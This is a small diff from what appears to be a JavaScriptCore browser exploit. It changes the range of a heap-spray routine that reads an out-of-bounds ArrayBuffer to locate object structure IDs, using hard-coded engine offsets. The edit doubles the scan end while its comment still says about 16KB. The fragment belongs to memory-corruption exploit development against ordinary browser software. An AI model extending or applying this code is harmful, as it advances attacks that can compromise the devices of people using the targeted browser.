@@ -127,7 +127,7 @@ export async function sprayAndInvestigateObjectExposure() {
 
         let found_sids_map = {};
         const SCAN_START = 0x100; 
-        const SCAN_END = Math.min(0x4000, oob_array_buffer_real.byteLength - 0x20); // Scan até ~16KB
+        const SCAN_END = Math.min(0x8000, oob_array_buffer_real.byteLength - 0x20); // Scan até ~16KB
         const SCAN_STEP_SID = 0x08; 
         const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
 
